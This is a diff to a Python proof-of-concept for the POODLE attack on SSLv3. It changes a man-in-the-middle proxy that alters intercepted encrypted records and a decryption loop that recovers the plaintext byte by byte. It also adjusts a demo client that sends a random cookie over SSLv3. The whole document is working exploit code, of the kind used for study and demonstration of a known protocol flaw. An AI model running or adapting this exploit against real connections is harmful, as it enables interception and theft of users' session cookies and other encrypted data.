@@ -12,6 +12,7 @@ import string
 import sys
 import struct
 import threading
+import time
 from pprint import pprint
 from struct import *
 
@@ -66,15 +67,16 @@ class Client:
     def __init__(self, host, port):
         self.proxy_host = host
         self.proxy_port = port
-        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(8))
+        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
         print "Sending request : "
         print "GET / HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n"
 
     def connection(self):
         # Initialization of the client
-        ssl_sock = socket.create_connection((self.proxy_host, self.proxy_port))
+        ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3)
-        
+        ssl_sock.connect((self.proxy_host,self.proxy_port))
+        ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         self.socket = ssl_sock
         return
     
@@ -122,11 +124,11 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
                         running = False
                         break
 
-                    if poodle.get_start_exploit() is True:
+                    if data_altered is True:
                         (content_type, version, length) = struct.unpack('>BHH', data[0:5])
                         if content_type == 23:
                             poodle.set_decipherable(True)
-                    
+                        data_altered = False
                     # we send data to the client
                     self.request.send(data)
 
@@ -148,7 +150,8 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
 
                     if content_type == 23 and length > length_header:
                         poodle.set_length_frame(data)
-                        data = poodle.alter()    
+                        data = poodle.alter()  
+                        data_altered = True  
                     
                     # we send data to the server
                     socket_server.send(ssl_header+data)
@@ -189,7 +192,6 @@ class Poodle(Client):
         self.start_exploit = False
         self.nb_prefix = 0
         self.decipherable = False
-        self.plaintext = []
         self.request = ''
         self.byte_decipher = 0
 
@@ -202,6 +204,8 @@ class Poodle(Client):
         print "Start decrypting the request...\n"
         self.exploit()
         print '\n'
+        print self.request
+        print '\n'
         self.client_disconect()
         return
 
@@ -213,38 +217,42 @@ class Poodle(Client):
         self.length_frame = len(data)
 
     def exploit(self):
-        # start at block 2, finish at block n-1
+        # start at block 2, finish at block n-2
         length_f = self.length_frame
-        for i in range(1,(self.length_frame/self.length_block) - 1):
+        for i in range(1,(length_f/self.length_block) - 1):
             self.current_block = i
-            for j in reversed(range(self.length_block)):
-                byte_found = self.find_plaintext_byte(self.frame,j)
-                self.request += re.sub('[\r\n]', ' ', byte_found)
+            for j in range(self.length_block-1, -1, -1):
+                (plain, nb_request) = self.find_plaintext_byte(self.frame,j)
+                self.request += plain
                 percent = 100.0 * self.byte_decipher / (length_f - 2 * self.length_block)
-                sys.stdout.write("\rProgression %.0f%% - %s" % (percent, self.request))
+                sys.stdout.write("\rProgression %2.0f%% - client's request %4s - byte found: %s" % (percent, nb_request, plain))
                 sys.stdout.flush()
+                print ''
         return
 
     def choosing_block(self, current_block):
         return self.frame[current_block * self.length_block:(current_block + 1) * self.length_block]
 
     def find_plaintext_byte(self, frame, byte):
-        i = 0
+        nb_request = 0
+        plain = ""
         while True:
             self.client_connection()
-
-            prefix_length = (byte + 1)
-            suffix_length = self.length_block - (byte + 1)            
+            time.sleep(0.0001)
+            prefix_length = byte
+            suffix_length = self.length_block - byte           
             
-            self.send_request_from_the_client(self.nb_prefix+prefix_length, suffix_length)
-            self.client_disconect()
+            self.send_request_from_the_client(self.length_block+self.nb_prefix+prefix_length, suffix_length)
+            self.client_disconect()          
             if self.decipherable is True:
                 self.byte_decipher += 1
                 plain = self.decipher(self.frame)
                 self.decipherable = False
                 break
-            i += 1
-        return chr(plain)
+            nb_request += 1
+            sys.stdout.write("\rclient's request %4s" % (nb_request))
+            sys.stdout.flush()
+        return (chr(plain), nb_request)
 
     def decipher(self, data):
         return self.choosing_block(self.current_block-1)[-1] ^ self.choosing_block(-2)[-1] ^ (self.length_block-1)
@@ -267,6 +275,7 @@ class Poodle(Client):
                 print "CBC block size " + str(self.length_block) + "\n"
                 break
             i += 1
+        self.decipherable = False
 
     def alter(self):
         if self.start_exploit is True:
